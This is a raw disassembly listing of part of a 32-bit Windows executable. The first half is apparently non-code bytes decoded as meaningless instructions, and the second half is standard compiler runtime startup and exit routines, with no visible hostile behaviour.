  4224a2:	xchg   esp,eax
  4224a3:	lock cmp al,0x32
  4224a6:	xor    edx,eax
  4224a8:	pop    ecx
  4224a9:	les    edx,FWORD PTR [ecx]
  4224ab:	sti    
  4224ac:	loop   0x42247d
  4224ae:	mov    ecx,gs
  4224b0:	not    DWORD PTR [eax-0x5f]
  4224b3:	xlat   BYTE PTR ds:[ebx]
  4224b4:	sub    BYTE PTR [ecx-0xb6681d2],cl
  4224ba:	jp     0x4224d2
  4224bc:	push   es
  4224bd:	loopne 0x4224f0
  4224bf:	mov    dh,0xe9
  4224c1:	jmp    0x25ac:0x16e2317
  4224c8:	int    0xff
  4224ca:	or     DWORD PTR [edi],0x3189eda5
  4224d0:	fsub   st(5),st
  4224d2:	inc    edx
  4224d3:	lock pushf 
  4224d5:	mov    bh,BYTE PTR [esi+0x3803f0b0]
  4224db:	inc    esi
  4224dc:	pushf  
  4224dd:	dec    eax
  4224de:	add    al,0x82
  4224e0:	inc    edx
  4224e1:	xor    DWORD PTR [edi-0x41e2faea],0xffffffeb
  4224e8:	push   ds
  4224e9:	inc    ecx
  4224ea:	and    DWORD PTR [esi-0x651880d],ebx
  4224f0:	lock cwde 
  4224f2:	call   0x52f7088e
  4224f7:	mov    eax,ds:0x1cd4bc47
  4224fc:	in     eax,0xec
  4224fe:	sbb    esi,ecx
  422500:	test   al,0x25
  422502:	mov    ebx,0xabe4cb6c
  422507:	xor    edi,DWORD PTR [edi]
  422509:	outs   dx,BYTE PTR ds:[esi]
  42250a:	xchg   BYTE PTR [ebp-0x3a9ed638],ah
  422510:	ins    DWORD PTR es:[edi],dx
  422511:	adc    bp,WORD PTR [esi-0x785cedc2]
  422518:	sub    eax,0x10bd600
  42251d:	push   ebx
  42251e:	outs   dx,DWORD PTR ds:[esi]
  42251f:	mov    ecx,DWORD PTR [ebx-0x1e06f334]
  422525:	dec    eax
  422526:	call   0xc5fa3c2a
  42252b:	fnstcw WORD PTR [eax+esi*4+0x52bbcb99]
  422532:	mov    esp,0xa0bde175
  422537:	cs jge 0x4225b0
  42253a:	outs   dx,BYTE PTR ds:[esi]
  42253b:	test   bl,al
  42253d:	nop
  42253e:	jmp    0xc0ecda61
  422543:	sbb    BYTE PTR [eax+0x1a847aa5],ch
  422549:	sub    cl,BYTE PTR [edi+0x7c2ca72a]
  42254f:	test   bl,cl
  422551:	mov    bl,BYTE PTR [edi]
  422553:	mov    ebp,0xd8b278dd
  422558:	and    al,0x2d
  42255a:	test   eax,0xc73075a
  42255f:	cmp    ch,BYTE PTR [ecx-0x1]
  422562:	xchg   BYTE PTR [esi+eiz*4-0x7daf705],bl
  422569:	push   es
  42256a:	add    eax,0xe695f936
  42256f:	fdiv   DWORD PTR [esi+0x77]
  422572:	je     0x422568
  422574:	add    BYTE PTR [ebx],0xd1
  422577:	adc    al,0xe2
  422579:	jg     0x4225bd
  42257b:	popa   
  42257c:	xchg   ecx,eax
  42257d:	les    esi,FWORD PTR [edx+0x4b]
  422580:	test   eax,0x795f7399
  422585:	ret    0x5472
  422588:	into   
  422589:	jmp    0xd51f9ad9
  42258e:	imul   esi,ecx,0x5
  422591:	mov    ebx,0xfc0a066e
  422596:	mov    ebp,edx
  422598:	jb     0x4225b9
  42259a:	stos   BYTE PTR es:[edi],al
  42259b:	test   BYTE PTR [edx],al
  42259d:	sub    al,0x36
  42259f:	push   ecx
  4225a0:	div    ch
  4225a2:	mov    WORD PTR [esi-0x622e366c],es
  4225a8:	xchg   ebp,eax
  4225a9:	or     bh,BYTE PTR [edi-0x55]
  4225ac:	xchg   DWORD PTR ds:0x38601de1,ecx
  4225b2:	or     al,0xac
  4225b4:	shr    DWORD PTR cs:[esi-0x2bf60312],1
  4225bb:	repz jae 0x422565
  4225be:	jge    0x4225da
  4225c0:	jle    0x422621
  4225c2:	xor    dh,BYTE PTR fs:[ebx]
  4225c5:	and    cl,BYTE PTR [ebx]
  4225c7:	jle    0x4225e3
  4225c9:	adc    ch,BYTE PTR [edx+0xe]
  4225cc:	out    dx,eax
  4225cd:	into   
  4225ce:	bound  esi,QWORD PTR [ecx]
  4225d0:	dec    ecx
  4225d1:	adc    esi,esp
  4225d3:	repnz inc ebp
  4225d5:	test   DWORD PTR [ecx-0x2d007f4f],esi
  4225db:	mov    al,0x3c
  4225dd:	jecxz  0x422570
  4225df:	test   al,0x56
  4225e1:	call   FWORD PTR [ecx-0x2f]
  4225e4:	cmp    DWORD PTR [eax],esp
  4225e6:	jmp    0x4533:0xcbd90406
  4225ed:	inc    esi
  4225ee:	and    al,cl
  4225f0:	dec    eax
  4225f1:	inc    ebx
  4225f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225f3:	and    ch,BYTE PTR [edx-0x57d62c3c]
  4225f9:	test   DWORD PTR [edx],0x9b0af21c
  4225ff:	mov    cl,0x23
  422601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422602:	out    dx,eax
  422603:	xchg   esp,eax
  422604:	inc    ebp
  422605:	adc    ch,dh
  422607:	push   edx
  422608:	pop    ds
  422609:	outs   dx,BYTE PTR ds:[esi]
  42260a:	xchg   edx,eax
  42260b:	hlt    
  42260c:	mov    DWORD PTR [ebx+0x7f15712],eax
  422612:	shl    DWORD PTR [ecx+ebx*4-0x1d],0x4a
  422617:	inc    edi
  422618:	cmp    DWORD PTR [ebp+0xbf4d8ee],0x1c08f04
  422622:	cld    
  422623:	mov    al,ds:0x3d5cc4de
  422628:	xchg   edx,eax
  422629:	and    al,0x22
  42262b:	in     eax,0x60
  42262d:	push   0xed75b1d
  422632:	rol    BYTE PTR [ecx],cl
  422634:	retf   0xa67b
  422637:	jno    0x4225ba
  422639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263a:	pop    edi
  42263b:	xchg   ebp,edi
  42263d:	rol    BYTE PTR [edi+0x4c499443],0x83
  422644:	fld    DWORD PTR [esi-0x6db57cd0]
  42264a:	mov    ds:0x7d0d9249,eax
  42264f:	iret   
  422650:	lods   al,BYTE PTR ds:[esi]
  422651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422652:	loope  0x4225d6
  422654:	adc    BYTE PTR [edi+0xc71f3ba],al
  42265a:	or     al,0x12
  42265c:	pop    ds
  42265d:	inc    eax
  42265e:	loopne 0x422636
  422660:	mov    ds:0x434f7788,eax
  422665:	xchg   BYTE PTR [ecx],dh
  422667:	pushf  
  422668:	in     eax,dx
  422669:	jbe    0x4226a8
  42266b:	into   
  42266c:	mov    eax,0x49bf0ae5
  422671:	into   
  422672:	sbb    al,BYTE PTR [edi+0x4]
  422675:	sub    BYTE PTR [edx+edi*8-0x16de3e07],ah
  42267c:	sub    cl,BYTE PTR [edx+ebp*8-0x77]
  422680:	sbb    DWORD PTR [edi+0x7d79637c],esp
  422686:	iret   
  422687:	xchg   DWORD PTR [ecx+0x38],ebp
  42268a:	stos   DWORD PTR es:[edi],eax
  42268b:	sub    eax,0xd22cf307
  422690:	lea    edx,[esi+0x3d]
  422693:	enter  0xf87b,0x84
  422697:	scas   al,BYTE PTR es:[edi]
  422698:	push   0x67543f5f
  42269d:	cld    
  42269e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42269f:	sbb    DWORD PTR [ebx],edi
  4226a1:	pop    esp
  4226a2:	jmp    0x4226cf
  4226a4:	push   edi
  4226a5:	pusha  
  4226a6:	aad    0xbf
  4226a8:	inc    ebx
  4226a9:	add    BYTE PTR [eax-0x6c],al
  4226ac:	outs   dx,DWORD PTR ds:[esi]
  4226ad:	clc    
  4226ae:	push   es
  4226af:	push   edx
  4226b0:	xchg   ebp,eax
  4226b1:	cdq    
  4226b2:	push   es
  4226b3:	push   edi
  4226b4:	or     dl,BYTE PTR [edi-0x43a6bdf7]
  4226ba:	mov    ss,WORD PTR [ecx]
  4226bc:	in     eax,dx
  4226bd:	adc    ecx,DWORD PTR [edi]
  4226bf:	xor    edi,ecx
  4226c1:	iret   
  4226c2:	mov    ebp,0x65f6973
  4226c7:	mov    ecx,0xde7ea4fe
  4226cc:	ret    0xb259
  4226cf:	push   ebp
  4226d0:	inc    esi
  4226d1:	in     al,dx
  4226d2:	push   0x38fd2c2a
  4226d7:	jp     0x422696
  4226d9:	xor    bl,BYTE PTR [ebx+0x6a]
  4226dc:	repz or eax,0x8b368233
  4226e2:	fwait
  4226e3:	jae    0x4226b3
  4226e5:	daa    
  4226e6:	dec    ebx
  4226e7:	stos   BYTE PTR es:[edi],al
  4226e8:	shl    eax,cl
  4226ea:	clc    
  4226eb:	ja     0x422698
  4226ed:	pop    edi
  4226ee:	jmp    0x1777:0x62a0858
  4226f5:	out    dx,eax
  4226f6:	sbb    al,0xdb
  4226f8:	sahf   
  4226f9:	je     0x422776
  4226fb:	test   esi,esi
  4226fd:	cmc    
  4226fe:	mov    eax,ds:0x253a0b06
  422703:	and    eax,0x313f8b3c
  422708:	out    0xf6,eax
  42270a:	push   edi
  42270b:	mov    ebx,0x10459207
  422710:	push   ss
  422711:	adc    DWORD PTR [esi+0x3bd09cbf],ebx
  422717:	dec    eax
  422718:	adc    DWORD PTR [eax],ebp
  42271a:	mov    al,0x89
  42271c:	popf   
  42271d:	arpl   WORD PTR [edi-0xb],si
  422720:	mov    ebx,0x373b85fc
  422725:	test   DWORD PTR [edx+0x34f3b5c2],ecx
  42272b:	(bad)  
  42272d:	mov    al,0xc2
  42272f:	shl    edi,0xe0
  422732:	push   0xa7d656eb
  422737:	push   0x7ec46dd3
  42273c:	and    cl,BYTE PTR [ebx]
  42273e:	(bad)  
  42273f:	cli    
  422740:	ins    DWORD PTR es:[edi],dx
  422741:	push   esp
  422742:	ror    BYTE PTR [eax+0x114e4c7c],1
  422748:	lea    edi,[eax+edi*4]
  42274b:	or     al,0x3b
  42274d:	jp     0x4226d0
  42274f:	inc    esi
  422750:	mov    bl,0x2e
  422752:	mov    al,0x3e
  422754:	pop    edx
  422755:	into   
  422756:	sbb    eax,0x2a981f38
  42275b:	rol    BYTE PTR [esp+edi*2],1
  42275e:	mov    edx,0xc4a5fe18
  422763:	push   cs
  422764:	leave  
  422765:	dec    ecx
  422766:	mov    ebx,0x143da3ff
  42276b:	mov    eax,ds:0xeac900a5
  422770:	or     al,BYTE PTR [ebp-0x5189e2f5]
  422776:	lock add esp,ecx
  422779:	adc    al,bl
  42277b:	(bad)  
  42277c:	into   
  42277d:	xchg   edi,eax
  42277e:	adc    eax,0x48cafab0
  422783:	loope  0x422740
  422785:	lds    esp,FWORD PTR [ebx]
  422787:	aaa    
  422788:	xchg   edi,eax
  422789:	jns    0x4227ee
  42278b:	push   cs
  42278c:	call   0xbc51ddf9
  422791:	or     ebx,DWORD PTR [eax-0x1b]
  422794:	mov    eax,ds:0x3b8b81b9
  422799:	mov    DWORD PTR [eax+ebp*8],esp
  42279c:	inc    eax
  42279d:	sbb    esp,esi
  42279f:	jmp    0x73957c11
  4227a4:	fidiv  WORD PTR [edi-0x31]
  4227a7:	mov    ebp,0x58d8176e
  4227ac:	les    ecx,FWORD PTR [edi+0x25547946]
  4227b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227b3:	es ins DWORD PTR es:[edi],dx
  4227b5:	adc    al,cl
  4227b7:	aad    0xcc
  4227b9:	fmul   st(4),st
  4227bb:	out    0x6f,eax
  4227bd:	xchg   ebx,eax
  4227be:	pushf  
  4227bf:	sub    al,0x34
  4227c1:	mov    al,0x45
  4227c3:	xchg   edi,eax
  4227c4:	fwait
  4227c5:	call   0xbac845b5
  4227ca:	push   0x478e3e5e
  4227cf:	xchg   esp,eax
  4227d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227d1:	jle    0x42282c
  4227d3:	xchg   ecx,eax
  4227d4:	adc    eax,esi
  4227d6:	(bad)  
  4227d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d8:	mov    eax,0x13b86414
  4227dd:	jmp    DWORD PTR [edi+ecx*4]
  4227e0:	in     eax,0x41
  4227e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227e3:	or     BYTE PTR [ebx+0x7],0x80
  4227e7:	mov    al,ds:0x740a6394
  4227ec:	ret    0x71d4
  4227ef:	mov    BYTE PTR [ecx+eax*2+0x31],ch
  4227f3:	push   ebp
  4227f4:	fcomi  st,st(5)
  4227f6:	jbe    0x4227a3
  4227f8:	dec    esp
  4227f9:	in     al,0x80
  4227fb:	add    DWORD PTR [eax+0x14d24d5f],ecx
  422801:	xor    al,0x82
  422803:	rcr    BYTE PTR [ecx+0x40],cl
  422806:	out    0x5b,al
  422808:	xor    ebx,DWORD PTR [ecx+eiz*1+0x78]
  42280c:	repnz mov al,0x86
  42280f:	test   DWORD PTR [esp+ebx*2-0x4c604c1c],edi
  422816:	cmp    ebx,edi
  422818:	or     BYTE PTR [eax+0xd],dl
  42281b:	scas   al,BYTE PTR es:[edi]
  42281c:	rcl    BYTE PTR [edi-0x1d],1
  42281f:	arpl   WORD PTR [ebx+0x2c],sp
  422822:	sub    eax,0x8da22ee8
  422827:	mov    edi,DWORD PTR [ecx-0x26a70e1e]
  42282d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42282e:	pop    ebp
  42282f:	leave  
  422830:	data16 hlt 
  422832:	sbb    ebp,0xffffffbd
  422835:	jmp    0xe668:0x2250aefa
  42283c:	retf   0xf10c
  42283f:	inc    ebx
  422840:	sub    al,cl
  422842:	aas    
  422843:	inc    ebp
  422844:	lock imul esi,DWORD PTR [ecx],0xffffffe5
  422848:	add    al,0xd5
  42284a:	fwait
  42284b:	dec    edx
  42284c:	xchg   esi,eax
  42284d:	popa   
  42284e:	bound  eax,QWORD PTR [edi-0x2c0284c2]
  422854:	mov    al,ds:0xbf328398
  422859:	xchg   esi,eax
  42285a:	(bad)  
  42285b:	mov    ecx,0xe78ad24f
  422860:	xor    ecx,DWORD PTR [ebp+ebp*8+0x5400f3db]
  422867:	push   0xffffffe1
  422869:	out    dx,al
  42286a:	jmp    0x9a88:0xe78d24a9
  422871:	mov    WORD PTR [esi+ebx*8],ds
  422874:	pop    ds
  422875:	pop    es
  422876:	dec    ecx
  422877:	sub    eax,0xde3ba72a
  42287c:	pusha  
  42287d:	dec    esi
  42287e:	jo     0x42285b
  422880:	add    ecx,esp
  422882:	mov    ah,BYTE PTR [eax-0x2e]
  422885:	loopne 0x4228bc
  422887:	sahf   
  422888:	or     BYTE PTR [edx],dh
  42288a:	dec    eax
  42288b:	add    dl,BYTE PTR ds:0x68be2e5
  422891:	inc    ebx
  422892:	lock sahf 
  422894:	sbb    al,0xd
  422896:	aam    0x89
  422898:	jmp    0x42290b
  42289a:	mov    fs,WORD PTR [eax-0x24]
  42289d:	inc    edi
  42289e:	adc    edi,DWORD PTR [edi+0x6c7d13c0]
  4228a4:	daa    
  4228a5:	stos   BYTE PTR es:[edi],al
  4228a6:	stos   DWORD PTR es:[edi],eax
  4228a7:	mov    eax,ds:0xaa4da5a1
  4228ac:	cmp    edx,DWORD PTR [ebx-0x6a]
  4228af:	xchg   ebx,eax
  4228b0:	sbb    al,0xfe
  4228b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228b3:	and    bl,BYTE PTR [edi]
  4228b5:	cdq    
  4228b6:	lock loopne 0x422871
  4228b9:	jp     0x422913
  4228bb:	mov    ds:0x1d77c84b,al
  4228c0:	add    ch,al
  4228c2:	dec    esp
  4228c3:	sbb    ch,bl
  4228c5:	xor    cl,al
  4228c7:	(bad)  
  4228c8:	int    0x54
  4228ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228cb:	fs pop ss
  4228cd:	xchg   ebx,eax
  4228ce:	push   esi
  4228cf:	(bad)
  4228d2:	daa    
  4228d3:	push   ebp
  4228d4:	inc    eax
  4228d5:	fcmovnb st,st(6)
  4228d7:	pop    es
  4228d8:	daa    
  4228d9:	sbb    DWORD PTR [ecx+0x48743a07],0xffffffb4
  4228e0:	pop    esi
  4228e1:	add    BYTE PTR [edx+eax*1+0x321b5ee2],bh
  4228e8:	or     eax,0x37e2ce16
  4228ed:	int3   
  4228ee:	aad    0xe2
  4228f0:	pop    esp
  4228f1:	(bad)  
  4228f2:	dec    ebx
  4228f3:	inc    edi
  4228f4:	lahf   
  4228f5:	xor    bh,BYTE PTR [ebp+0x24]
  4228f8:	mov    edi,0xcf00ec57
  4228fd:	and    DWORD PTR [edi],ecx
  4228ff:	push   ss
  422900:	mov    cl,0x73
  422902:	pop    ebp
  422903:	gs fwait
  422905:	mov    ah,0x4c
  422907:	xchg   edi,eax
  422908:	rol    DWORD PTR [esi-0x77],0x46
  42290c:	mov    ecx,0x5dfa2aa3
  422911:	retf   
  422912:	xchg   edx,eax
  422913:	sub    esp,DWORD PTR ss:[edi-0x502259e5]
  42291a:	stos   BYTE PTR es:[edi],al
  42291b:	fucomip st,st(4)
  42291d:	cs enter 0xf458,0xd2
  422922:	fidivr DWORD PTR [edx+0x5d]
  422925:	cmp    DWORD PTR [ebx+0x46],0x8
  422929:	sbb    DWORD PTR [ebx+esi*1+0x35d96afb],esi
  422930:	retf   0xed79
  422933:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422934:	imul   ebp,ecx,0xafc58bc0
  42293a:	imul   edx,eax,0xea55beb
  422940:	pop    edx
  422941:	je     0x422925
  422943:	push   0xb58280dd
  422948:	sbb    eax,0x16ea1db8
  42294d:	(bad)  
  42294e:	mov    WORD PTR [eax+0x27],?
  422951:	ror    edi,0x38
  422954:	xchg   edi,eax
  422955:	xchg   esi,eax
  422956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422957:	cmp    ebx,DWORD PTR [edx+0x25]
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
